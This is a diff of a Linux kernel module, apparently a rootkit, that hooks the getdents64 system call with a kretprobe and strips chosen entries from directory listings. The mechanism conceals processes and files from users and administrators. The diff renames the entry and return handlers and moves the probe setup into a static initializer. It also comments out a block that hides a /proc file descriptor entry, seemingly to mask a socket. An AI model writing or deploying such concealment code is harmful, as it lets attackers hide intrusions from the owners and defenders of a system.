@@ -27,10 +27,6 @@ static unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t
 static unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_offset, int entry_size);
 
 
-static struct kretprobe kretp = {
-        .maxactive = 20
-};
-
 struct getdent64_arguments {
     unsigned int fd;
     void* buffer_ptr;
@@ -46,7 +42,7 @@ static bool hide_entry_by_name(struct linux_dirent64* entry, void* data){
 }
 
 
-static int handler_pre(struct kretprobe_instance *ri, struct pt_regs *regs)
+static int getents64_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
     struct getdent64_arguments* args;
     // syscall wrappers __x64_sys_* gets only ptr to regs
@@ -66,7 +62,7 @@ static int handler_pre(struct kretprobe_instance *ri, struct pt_regs *regs)
     return 0;
 }
 
-static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
+static int getents64_handle_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
     struct getdent64_arguments* args = (struct getdent64_arguments*) ri->data;
     unsigned long buffer_count = regs_return_value(regs);
@@ -78,45 +74,51 @@ static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
     //pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
 
     // filter socket
-    char fd_path[256];
-
-    struct file* file = files_lookup_fd_raw(current->files, args->fd);
-    struct dentry* dentry = file->f_path.dentry;
-    char* path = dentry_path_raw(dentry, fd_path, 256);
-
-    struct super_block* sb= file->f_path.mnt->mnt_sb;
-
-    // checking if the vfs is proc
-    if(strcmp(sb->s_id, "proc") == 0){
-        if(strcmp(path, hide_pid_path) == 0){
-            pr_info("found usage in path=%s\n", path);
-
-            {
-                unsigned long offset = 0;
-
-                // find entry to hide
-                while(offset < new_size){
-                    struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr + offset);
-                    pr_info("name=%s\n", current_ent->d_name);
-                    offset += current_ent->d_reclen;
-                }
-            }
-
-            char* fd_name = "3";
-            unsigned int new_size2 = hide_entry(args->buffer_ptr, new_size, hide_entry_by_name, fd_name);
-            regs_set_return_value(regs, new_size2);
-        }
-    }
+//    char fd_path[256];
+//
+//    struct file* file = files_lookup_fd_raw(current->files, args->fd);
+//    struct dentry* dentry = file->f_path.dentry;
+//    char* path = dentry_path_raw(dentry, fd_path, 256);
+//
+//    struct super_block* sb= file->f_path.mnt->mnt_sb;
+//
+//    // checking if the vfs is proc
+//    if(strcmp(sb->s_id, "proc") == 0){
+//        if(strcmp(path, hide_pid_path) == 0){
+//            pr_info("found usage in path=%s\n", path);
+//
+//            {
+//                unsigned long offset = 0;
+//
+//                // find entry to hide
+//                while(offset < new_size){
+//                    struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr + offset);
+//                    pr_info("name=%s\n", current_ent->d_name);
+//                    offset += current_ent->d_reclen;
+//                }
+//            }
+//
+//            char* fd_name = "3";
+//            unsigned int new_size2 = hide_entry(args->buffer_ptr, new_size, hide_entry_by_name, fd_name);
+//            regs_set_return_value(regs, new_size2);
+//        }
+//    }
 
     return 0;
 }
 
+
+static struct kretprobe kretp = {
+        .maxactive = 20,
+        .entry_handler = getents64_handle_entry,
+        .handler = getents64_handle_return,
+        .kp.symbol_name = "__x64_sys_getdents64",
+        .data_size = sizeof(struct getdent64_arguments),
+};
+
+
 static int __init entrypoint(void)
 {
-    kretp.entry_handler = handler_pre;
-    kretp.handler = handle_post;
-    kretp.kp.symbol_name = "__x64_sys_getdents64";
-    kretp.data_size = sizeof(struct getdent64_arguments);
 
     if (register_kretprobe(&kretp) < 0) {
         pr_info("register_kretprobe failed\n");
